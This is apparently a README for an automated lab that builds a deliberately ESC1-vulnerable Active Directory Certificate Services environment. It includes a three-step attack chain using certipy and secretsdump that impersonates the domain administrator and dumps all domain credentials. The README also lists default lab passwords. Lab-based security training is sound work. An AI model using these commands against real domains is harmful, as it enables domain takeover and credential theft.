# AD Attack Scenario - ESC1 Vulnerability Lab

This repository contains a fully automated Active Directory Certificate Services (AD CS) ESC1 vulnerability lab environment.

## 🎯 What This Lab Does

Demonstrates the **ESC1 vulnerability** - a critical AD CS misconfiguration that allows privilege escalation from a low-privileged domain user to Domain Administrator by exploiting certificate templates that allow Subject Alternative Name (SAN) specification.

## 📋 Prerequisites

Before starting, ensure you have the following installed on your host:

### Required Software

1. **Libvirt/KVM** (native Linux virtualization)
   ```bash
   # Ubuntu/Debian
   sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virt-manager
   sudo usermod -aG libvirt,kvm $USER
   newgrp libvirt
   ```

2. **Vagrant** (2.3.0+) with Libvirt plugin
   ```bash
   # Install Vagrant
   sudo apt install vagrant

   # Install dependencies for vagrant-libvirt
   sudo apt install libvirt-dev
   
   # Install vagrant-libvirt plugin
   vagrant plugin install vagrant-libvirt
   ```

3. **Ansible** (2.10+)
   ```bash
   # Ubuntu/Debian
   sudo apt install ansible
   
   # Python WinRM for Windows management
   pip3 install pywinrm
   ```

### System Requirements

- **RAM**: At least 16 GB (20 GB recommended)
- **Disk Space**: At least 80 GB free
- **CPU**: 4 cores minimum (8 cores recommended)

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/omar1111eamsa/ad-attack-senario.git
cd ad-attack-senario
```

### 2. Provide the Ansible Vault password

The domain secrets live in an **Ansible Vault** (`group_vars/all/vault.yml`).
The vault password is **not** committed — create the password file once so
provisioning can decrypt unattended (the lab vault password is `vagrant`):

```bash
echo 'vagrant' > scenario-1/infra/ansible/.vault_pass
chmod 600 scenario-1/infra/ansible/.vault_pass
```

### 3. Navigate to Vagrant Directory

```bash
cd scenario-1/infra/vagrant
```

### 4. Start the Environment

```bash
vagrant up
```

**This single command will:**
- Create 4 VMs (DC, CA, Win10, Kali Attacker) with Libvirt/KVM
- Auto-configure network IPs (no manual setup needed!)
- Install Windows Server with Active Directory
- Configure Certificate Authority
- Create ESC1 vulnerable template
- Configure LDAPS
- Set up test user account
- Install attack tools on Kali

**⏱️ First run takes 30-60 minutes** depending on your internet speed and hardware.

### 5. Wait for Provisioning

The setup is fully automated. Vagrant will provision all VMs using Ansible. Wait until you see:

```
==> attacker: Running provisioner: ansible...
PLAY [Verify network configuration on Windows hosts] ****************************
...
PLAY RECAP *********************************************************************
dc                         : ok=XX    changed=XX    ...
ca                         : ok=XX    changed=XX    ...
win10                      : ok=XX    changed=XX    ...
attacker                   : ok=XX    changed=XX    ...
```

## 🎓 Exploiting ESC1

### SSH into Attacker Machine

```bash
vagrant ssh attacker
```

### Run the Attack Commands

```bash
# Step 1: Request certificate as Administrator (ESC1 Exploit)
certipy req -u jdoe@serini.lab -p 'Summer2024!' -ca SERINI-CA -target ca.serini.lab -template VulnUserAuth -upn administrator@serini.lab

# Step 2: Authenticate with certificate and get hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.121.10

# Step 3: DCSync - Dump all domain credentials
secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.121.10
```

Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.

## 🏗️ Lab Architecture

```
┌─────────────────────┐
│   Domain Controller │
│   (dc.serini.lab)   │
│   192.168.121.10    │
└──────────┬──────────┘
           │
           │
┌──────────┴──────────┐       ┌─────────────────────┐
│        CA           │       │   Windows 10 Client │
│  (ca.serini.lab)    │       │  (win10.serini.lab) │
│  192.168.121.20     │       │   192.168.121.40    │
└─────────────────────┘       └─────────────────────┘
           │
           │
┌──────────┴──────────┐
│   Kali Attacker     │
│     (attacker)      │
│   192.168.121.50    │
└─────────────────────┘
```

## 📂 Project Structure

```
.
├── scenario-1/
│   ├── docs/
│   │   └── attack-guide.md           # Detailed attack walkthrough
│   ├── infra/
│   │   ├── ansible/
│   │   │   ├── playbooks/
│   │   │   │   ├── site.yml          # Master playbook
│   │   │   │   ├── 00-network.yml    # Network setup
│   │   │   │   ├── 00-bootstrap-network-forwarded.yml # Bootstrap IPs via forwarded WinRM
│   │   │   │   ├── 01-domain.yml     # AD Domain setup
│   │   │   │   ├── 02-adcs.yml       # Certificate Authority
│   │   │   │   ├── 06-esc1-template.yml  # Vulnerable template
│   │   │   │   └── 08-ldaps-config.yml   # LDAPS configuration
│   │   │   ├── inventory.yml
│   │   │   └── ansible.cfg
│   │   └── vagrant/
│   │       └── Vagrantfile            # VM definitions
│   └── scripts/
│       ├── 01-create-vulnerable-template.ps1
│       └── 02-create-test-user.ps1
└── README.md
```

## 🔧 Useful Commands

### VM Management

```bash
# Start all VMs
vagrant up

# Stop all VMs
vagrant halt

# Destroy all VMs (clean slate)
vagrant destroy -f

# Check VM status
vagrant status

# SSH into specific VM
vagrant ssh dc       # Domain Controller
vagrant ssh ca       # Certificate Authority
vagrant ssh win10    # Windows 10 client
vagrant ssh attacker # Kali attacker
```

**VM Access:** All VMs have graphical consoles via `virt-manager` or `virt-viewer`. To connect:
```bash
# Open graphical manager
virt-manager

# Or connect to specific VM
virt-viewer dc
```

### Re-run Provisioning

If you need to re-run the Ansible setup:

```bash
cd scenario-1/infra/vagrant
vagrant provision
```

## 🧪 Manual Ansible Execution

If you want to run Ansible playbooks manually:

```bash
cd scenario-1/infra/ansible

# Run all playbooks
ansible-playbook -i inventory.yml playbooks/site.yml

# Run specific playbook
ansible-playbook -i inventory.yml playbooks/06-esc1-template.yml
```

## 🔐 Default Credentials

### Domain Admin
- **Username**: `SERINI\Administrator`
- **Password**: `P@ssw0rd123!`

### Test User (for exploitation)
- **Username**: `jdoe`
- **Password**: `Summer2024!`
- **Domain**: `serini.lab`

### Kali Attacker
- **Username**: `vagrant`
- **Password**: `vagrant`

## 🐛 Troubleshooting

### VMs Not Starting

```bash
# Check running libvirt domains
sudo virsh list --all

# Or use Vagrant status
vagrant status
```

### Libvirt Network Issues

**VMs not getting IPs:**
```bash
# Check libvirt default network
sudo virsh net-list
sudo virsh net-start vagrant-libvirt  # if not running

# Check VM network interfaces
vagrant ssh dc -c "ipconfig"
```

**Cannot ping between VMs:**
```bash
# From attacker VM
vagrant ssh attacker
ping 192.168.121.10  # Should reach DC
```

### Ansible Connection Errors

```bash
# Test WinRM connectivity
ansible dc -i scenario-1/infra/ansible/inventory.yml -m win_ping
```

### GPO / "Not associated with Active Directory domain or forest"

If `03-software-gpo` fails with that error, the playbook now uses `-Domain serini.lab` for Get-GPO/New-GPO. Ensure `01-domain` and `02-adcs` have completed (including reboots) before `03-software-gpo` runs.

### ESC1 Exploitation Failing

1. Ensure LDAPS is configured:
   ```bash
   cd scenario-1/infra/ansible
   ansible-playbook -i inventory.yml playbooks/08-ldaps-config.yml
   ```

2. Verify template permissions:
   ```bash
   ansible-playbook -i inventory.yml playbooks/99-fix-enroll-permission.yml
   ```

3. Check DNS on Kali:
   ```bash
   vagrant ssh attacker -c "cat /etc/hosts | grep serini"
   ```

## 📚 Learning Resources

- [AD CS ESC1 Vulnerability Details](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Active Directory Security](https://adsecurity.org/)

## ⚠️ Disclaimer

This lab is for **educational purposes only**. Only use these techniques in authorized environments. Unauthorized access to computer systems is illegal.

## 📝 License

MIT License - See LICENSE file for details

## 🤝 Contributing

Feel free to open issues or submit pull requests to improve this lab!

## 👨‍💻 Author

Created for Active Directory security training and ESC1 vulnerability demonstration.
